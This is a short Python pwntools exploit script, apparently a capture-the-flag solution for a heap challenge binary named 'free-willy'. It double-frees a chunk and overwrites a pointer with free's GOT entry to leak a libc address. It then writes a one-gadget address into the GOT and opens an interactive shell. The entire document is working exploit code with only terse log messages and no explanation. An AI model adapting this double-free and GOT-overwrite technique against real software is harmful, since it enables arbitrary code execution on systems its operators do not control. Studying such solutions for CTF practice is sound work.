from pwn import *

def adopt(name):
    p.sendline("adopt")
    p.recvuntil("?\n")
    p.sendline(name)

def disown(idx):
    p.sendline("disown")
    p.recv()
    p.sendline(idx)

def name(idx, data):
    p.sendline("name")
    p.recv()
    p.sendline(idx)
    p.recvuntil("?\n")
    p.sendline(data)

elf = ELF("./free-willy")
libc = elf.libc

o_gadget = 0xe5858

if args.GDB:
    p = gdb.debug(elf.path, gdbscript="start")
else:
    p = process(elf.path)

p.recvuntil("> ")
log.info("create first whale")
adopt("foo")

log.info("double free the whale")
p.recvuntil("> ")
disown("0")
p.recvuntil("> ")
disown("0")

log.info("replace name of the whale by the address of free in got")
payload = p64(0) + p64(elf.got['free']) + p64(0x50) + p64(0x1)
p.recvuntil("> ")
adopt(payload)

log.info("retrive free adress in plt")
p.recvuntil("> ")
p.sendline("observe")
p.recvuntil("0. ")
data = p.recvline().strip("\n")
l_free = u64(data.ljust(8, "\x00"))
l_libc = l_free - libc.symbols["free"]
gadget = l_libc + o_gadget

log.info("addr of free %s" % hex(l_free))
log.info("addr of libc %s" % hex(l_libc))
log.info("addr of gadget %s" % hex(gadget))

p.recv()
p.sendline("0")
p.recv()

name("0", p64(gadget) * 10)
p.interactive()

